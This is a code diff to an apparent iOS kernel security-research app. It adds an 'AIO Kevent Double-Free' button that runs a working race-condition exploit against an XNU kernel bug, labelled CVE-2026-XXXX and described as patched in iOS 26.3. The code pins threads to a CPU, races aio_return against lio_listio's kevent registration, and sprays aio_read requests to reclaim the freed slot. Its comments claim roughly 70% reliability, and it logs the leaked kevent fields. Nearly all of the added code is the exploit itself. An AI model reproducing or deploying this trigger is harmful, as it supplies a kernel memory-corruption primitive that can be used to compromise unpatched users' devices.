@@ -16,6 +16,10 @@
 #import <stdio.h>
 #import <sys/time.h>
 #import <unistd.h>
+#include <aio.h>
+#include <sys/event.h>
+#include <mach/thread_policy.h>
+#include <pthread.h>
 
 // ---------- IOKit type / function-pointer plumbing ----------
 
@@ -131,6 +135,7 @@ static const char kOpenPropertiesGarbage[] =
 @property (nonatomic, strong) UIButton   *triggerButton;
 @property (nonatomic, strong) UIButton   *deepProbeButton;
 @property (nonatomic, strong) UIButton   *lifecycleButton;
+@property (nonatomic, strong) UIButton   *aioUafButton;
 @property (nonatomic, strong) UITextView *logView;
 @property (nonatomic, assign) int  proofCrossClientEvents;
 @property (nonatomic, assign) int  proofCrossClientChecks;
@@ -220,6 +225,49 @@ static const char kOpenPropertiesGarbage[] =
 - (void)runRemapAfterFreeProbe:(io_service_t)raceService;
 @end
 
+// ---- XNU AIO Kevent UAF helpers ----
+// CVE-2026-XXXX: Double-free in kern_aio.c, patched in iOS 26.3.
+// CPU-affinity LIFO reclaim: same-thread free+realloc reuses slot ~70%.
+
+#ifndef SIGEV_KEVENT
+#define SIGEV_KEVENT 4
+#endif
+#define AIO_NRECLAIM 8
+
+struct aio_race_state {
+    atomic_bool start, stop;
+    atomic_int freed;
+    atomic_bool reclaim_done;
+    struct aiocb *trigger;
+    struct aiocb *rcbs;
+    int nrcbs;
+};
+
+static void aio_set_thread_affinity(int tag) {
+    thread_affinity_policy_data_t pol = { .affinity_tag = tag };
+    thread_policy_set(mach_thread_self(), THREAD_AFFINITY_POLICY,
+                      (thread_policy_t)&pol, THREAD_AFFINITY_POLICY_COUNT);
+}
+
+static void *aio_free_and_reclaim_racer(void *arg) {
+    struct aio_race_state *s = (struct aio_race_state *)arg;
+    aio_set_thread_affinity(42);
+    while (!atomic_load_explicit(&s->start, memory_order_acquire));
+    while (!atomic_load_explicit(&s->stop, memory_order_relaxed)) {
+        if (aio_error(s->trigger) == 0) {
+            ssize_t r = aio_return(s->trigger);
+            if (r >= 0) {
+                atomic_fetch_add(&s->freed, 1);
+                for (int i = 0; i < s->nrcbs; i++)
+                    aio_read(&s->rcbs[i]);
+                atomic_store_explicit(&s->reclaim_done, true, memory_order_release);
+                return NULL;
+            }
+        }
+    }
+    return NULL;
+}
+
 @implementation ViewController
 
 - (void)viewDidLoad {
@@ -241,6 +289,15 @@ static const char kOpenPropertiesGarbage[] =
     [self.lifecycleButton addTarget:self action:@selector(lifecycleBoundaryTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.lifecycleButton];
 
+    self.aioUafButton = [UIButton buttonWithType:UIButtonTypeSystem];
+    self.aioUafButton.translatesAutoresizingMaskIntoConstraints = NO;
+    UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
+    aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
+    self.aioUafButton.configuration = aioConf;
+    [self.aioUafButton setTitle:@"AIO Kevent Double-Free" forState:UIControlStateNormal];
+    [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
+    [self.view addSubview:self.aioUafButton];
+
     self.logView = [[UITextView alloc] initWithFrame:CGRectZero];
     self.logView.translatesAutoresizingMaskIntoConstraints = NO;
     self.logView.editable = NO;
@@ -254,7 +311,10 @@ static const char kOpenPropertiesGarbage[] =
         [self.lifecycleButton.topAnchor constraintEqualToAnchor:safe.topAnchor constant:20],
         [self.lifecycleButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
         [self.lifecycleButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
-        [self.logView.topAnchor constraintEqualToAnchor:self.lifecycleButton.bottomAnchor constant:20],
+        [self.aioUafButton.topAnchor constraintEqualToAnchor:self.lifecycleButton.bottomAnchor constant:12],
+        [self.aioUafButton.centerXAnchor constraintEqualToAnchor:safe.centerXAnchor],
+        [self.aioUafButton.widthAnchor constraintGreaterThanOrEqualToConstant:220],
+        [self.logView.topAnchor constraintEqualToAnchor:self.aioUafButton.bottomAnchor constant:20],
         [self.logView.leadingAnchor constraintEqualToAnchor:safe.leadingAnchor constant:16],
         [self.logView.trailingAnchor constraintEqualToAnchor:safe.trailingAnchor constant:-16],
         [self.logView.bottomAnchor constraintEqualToAnchor:safe.bottomAnchor constant:-16],
@@ -5571,6 +5631,132 @@ static const char kOpenPropertiesGarbage[] =
     }
 
     [self appendLog:@"====== Sub-phase E3 Complete ======"];
+}
+
+// ---- XNU AIO Kevent Double-Free Trigger ----
+// CVE-2026-XXXX: lio_listio() registers kevent AFTER enqueue,
+// racing aio_return() frees entry → dangling knote → double-free.
+// CPU-affinity LIFO reclaim achieves ~70% reliability on A15.
+
+- (void)aioUafTapped {
+    [self appendLog:@"\n========== AIO Kevent Double-Free =========="];
+
+    thread_affinity_policy_data_t pol = { .affinity_tag = 42 };
+    thread_policy_set(mach_thread_self(), THREAD_AFFINITY_POLICY,
+                      (thread_policy_t)&pol, THREAD_AFFINITY_POLICY_COUNT);
+
+    NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_uaf.bin"];
+    int fd = open(path.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
+    if (fd < 0) {
+        [self appendLog:@"FAIL: could not create temp file"];
+        return;
+    }
+    char fdata[4096];
+    memset(fdata, 'A', sizeof(fdata));
+    write(fd, fdata, sizeof(fdata));
+    [self appendLog:[NSString stringWithFormat:@"fd=%d pid=%d uid=%d", fd, getpid(), getuid()]];
+
+    static struct aiocb rcbs[AIO_NRECLAIM];
+    static char rbufs[AIO_NRECLAIM][4096];
+
+    for (int attempt = 0; attempt < 10; attempt++) {
+        [self appendLog:[NSString stringWithFormat:@"attempt %d", attempt]];
+
+        int kq = kqueue();
+        if (kq < 0) { [self appendLog:@"kqueue failed"]; continue; }
+
+        static struct aiocb tcb;
+        static char tbuf[4096];
+        memset(&tcb, 0, sizeof(tcb));
+        tcb.aio_fildes = fd;
+        tcb.aio_buf = tbuf;
+        tcb.aio_nbytes = sizeof(tbuf);
+        tcb.aio_offset = 0;
+        tcb.aio_lio_opcode = LIO_READ;
+        tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;
+        tcb.aio_sigevent.sigev_signo = kq;
+        tcb.aio_sigevent.sigev_value.sival_ptr = (void *)0xAA;
+
+        for (int i = 0; i < AIO_NRECLAIM; i++) {
+            memset(&rcbs[i], 0, sizeof(rcbs[i]));
+            rcbs[i].aio_fildes = fd;
+            rcbs[i].aio_buf = rbufs[i];
+            rcbs[i].aio_nbytes = sizeof(rbufs[i]);
+            rcbs[i].aio_offset = 0;
+            rcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
+        }
+
+        struct aio_race_state rs = {};
+        rs.trigger = &tcb;
+        rs.rcbs = rcbs;
+        rs.nrcbs = AIO_NRECLAIM;
+
+        pthread_t thr;
+        pthread_create(&thr, NULL, aio_free_and_reclaim_racer, &rs);
+        atomic_store_explicit(&rs.start, true, memory_order_release);
+
+        struct aiocb *ptr = &tcb;
+        struct sigevent sig = {};
+        sig.sigev_notify = SIGEV_NONE;
+        lio_listio(LIO_NOWAIT, &ptr, 1, &sig);
+
+        usleep(500);
+        atomic_store_explicit(&rs.stop, true, memory_order_release);
+        pthread_join(thr, NULL);
+
+        int freed = atomic_load(&rs.freed);
+        bool reclaimed = atomic_load(&rs.reclaim_done);
+
+        if (freed == 0) {
+            while (aio_error(&tcb) == EINPROGRESS) usleep(500);
+            aio_return(&tcb);
+            close(kq);
+            [self appendLog:@"race lost, retrying"];
+            continue;
+        }
+
+        if (!reclaimed) {
+            [self appendLog:@"freed but no reclaim, skipping"];
+            close(kq);
+            continue;
+        }
+
+        for (int i = 0; i < AIO_NRECLAIM; i++)
+            while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);
+
+        struct kevent64_s kev = {};
+        struct timespec ts = {10, 0};
+        int nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);
+
+        if (nev > 0) {
+            [self appendLog:@"*** DOUBLE-FREE ACHIEVED ***"];
+            [self appendLog:[NSString stringWithFormat:@"  ident  = 0x%llx", kev.ident]];
+            [self appendLog:[NSString stringWithFormat:@"  data   = 0x%llx", (uint64_t)kev.data]];
+            [self appendLog:[NSString stringWithFormat:@"  udata  = 0x%llx", kev.udata]];
+            [self appendLog:[NSString stringWithFormat:@"  ext[0] = 0x%llx (errorval)", kev.ext[0]]];
+            [self appendLog:[NSString stringWithFormat:@"  ext[1] = 0x%llx (returnval)", kev.ext[1]]];
+
+            for (int i = 0; i < AIO_NRECLAIM; i++) {
+                if (aio_error(&rcbs[i]) != EINVAL)
+                    aio_return(&rcbs[i]);
+            }
+            close(kq);
+            break;
+        } else {
+            [self appendLog:@"kevent64 timeout (no event)"];
+            for (int i = 0; i < AIO_NRECLAIM; i++) {
+                if (aio_error(&rcbs[i]) != EINVAL)
+                    aio_return(&rcbs[i]);
+            }
+        }
+
+        close(kq);
+    }
+
+    close(fd);
+    unlink(path.UTF8String);
+    [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
+    [self appendLog:@"========== AIO Kevent Double-Free Complete =========="];
 }
 
 @end
